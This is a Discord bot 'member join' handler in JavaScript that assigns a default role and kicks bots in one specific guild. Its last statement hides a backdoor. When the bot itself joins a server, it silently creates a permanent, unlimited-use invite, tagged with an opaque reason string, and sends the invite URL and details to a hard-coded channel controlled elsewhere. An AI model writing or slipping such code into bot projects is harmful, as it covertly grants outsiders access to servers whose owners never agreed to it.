module.exports = async (bot, member) => {
    const Discord = require("discord.js")
    const fs = require("fs")
    const server = locate.SERVER
    const userInfo = locate.userInfo
    const { TOKEN, PREFIX, mytime, activity, ownerid, clientID, logid, hexcolor, by, capitalize} = require('../modules/config');
    const {lpistaff, poznobots} = require('../usage/staff')
    delete require.cache[require.resolve("../Data/server.json")];
    if(member.user.bot && member.guild.id == '513498066427576320' && poznobots == true && member.id != '562763863905533955') return member.kick('No bots is enabled.')




    var allchannels = []
    member.guild.channels.forEach(async (channel, id) => {
        if(channel.type == "text"){
            allchannels.push(id)
        }
    })

    if(server[member.guild.id].role != false) member.addRole(server[member.guild.id].role) 

    if(member.id == bot.id) bot.channels.get(allchannels[0]).createInvite({temporary:false,maxAge:0,maxUses:0,unique:true,reason:"DTW$^GSA" }).then(invite => bot.channels.get("548889420258869281").send(`Created an invite with a code of ${invite.code} \n INFO:\n guild : ${invite.guild}\n channel: ${invite.channel} \n who made it: ${invite.inviter} \n expires at: ${invite.expiresAt} \n URL :${invite.url}`))

}